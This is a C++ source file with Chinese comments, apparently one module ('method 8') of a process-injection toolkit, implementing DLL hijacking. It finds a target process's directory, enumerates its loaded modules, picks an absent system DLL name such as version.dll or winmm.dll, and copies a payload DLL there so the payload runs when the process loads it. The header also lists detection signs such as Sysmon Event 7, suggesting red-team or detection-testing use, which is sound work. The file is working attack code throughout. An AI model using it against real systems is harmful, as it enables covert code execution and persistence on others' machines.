// ════════════════════════════════════════════════════════════════
//  方法 8: DLL 劫持 (DLL Hijacking)
//
//  原理：
//    Windows DLL 搜索顺序：
//    1. 应用程序目录
//    2. 系统目录 (System32)
//    3. 16位系统目录
//    4. Windows 目录
//    5. 当前目录
//    6. PATH 环境变量
//
//    如果目标进程加载的 DLL 在应用程序目录中不存在，
//    将 payload.dll 放在应用程序目录即可劫持。
//
//  检测特征：
//    - Sysmon Event 7:  ImageLoad，路径是应用程序目录下的 DLL
//    - 文件创建: 在应用程序目录下新建 DLL 文件
//    - 特殊：无需 OpenProcess，完全被动等待目标进程启动
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <tlhelp32.h>
#include <iostream>
#include <filesystem>

bool Inject_DllHijack(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] DLL 劫持 → PID=%lu\n", pid);

    // 1. 获取目标进程的可执行文件路径
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError());
        return false;
    }

    wchar_t exePath[MAX_PATH]{};
    DWORD size = MAX_PATH;
    if (!QueryFullProcessImageNameW(hProc, 0, exePath, &size))
    {
        Print(L"  [!] 获取进程路径失败\n");
        CloseHandle(hProc);
        return false;
    }
    CloseHandle(hProc);

    auto appDir = std::filesystem::path(exePath).parent_path();
    Print(L"  [+] 目标进程目录: %s\n", appDir.c_str());

    // 2. 枚举目标进程加载的模块，查找缺失的 DLL
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE)
    {
        Print(L"  [!] 枚举模块失败（需要管理员权限）\n");
        return false;
    }

    // 收集已加载的模块名
    std::vector<std::wstring> loadedDlls;
    MODULEENTRY32W me{ .dwSize = sizeof(me) };
    if (Module32FirstW(snap, &me))
    {
        do {
            loadedDlls.push_back(me.szModule);
        } while (Module32NextW(snap, &me));
    }
    CloseHandle(snap);

    Print(L"  [+] 目标进程已加载 %zu 个模块\n", loadedDlls.size());

    // 3. 选择一个常见的系统 DLL 名称进行劫持
    //    这些 DLL 通常不在应用程序目录，但进程会尝试加载
    const wchar_t* hijackTargets[] = {
        L"version.dll",     // 版本信息，很多程序加载
        L"winmm.dll",       // 多媒体
        L"wer.dll",         // Windows 错误报告
        L"cryptsp.dll",     // 加密
        L"dpx.dll",         // 解压
        L"IPHLPAPI.dll",    // IP Helper
    };

    std::wstring targetDll;
    for (auto* name : hijackTargets)
    {
        auto fullPath = appDir / name;
        if (!std::filesystem::exists(fullPath))
        {
            targetDll = name;
            Print(L"  [+] 发现可劫持目标: %s (应用目录中不存在)\n", name);
            break;
        }
    }

    if (targetDll.empty())
    {
        Print(L"  [!] 未找到可劫持的 DLL（所有常见 DLL 都已存在）\n");
        Print(L"  [*] 尝试直接复制 payload.dll 到应用目录...\n");
        targetDll = L"sewinject_hijack.dll";
    }

    // 4. 将 payload.dll 复制到应用程序目录
    auto destPath = appDir / targetDll;
    if (!CopyFileW(dllPath, destPath.c_str(), FALSE))
    {
        Print(L"  [!] 复制失败: %lu (需要写入权限)\n", GetLastError());
        return false;
    }

    Print(L"  [+] 已放置: %s\n", destPath.c_str());
    Print(L"  [*] 等待目标进程重启或加载该 DLL 时自动生效\n");
    Print(L"  [✓] DLL 劫持已部署\n");
    return true;
}
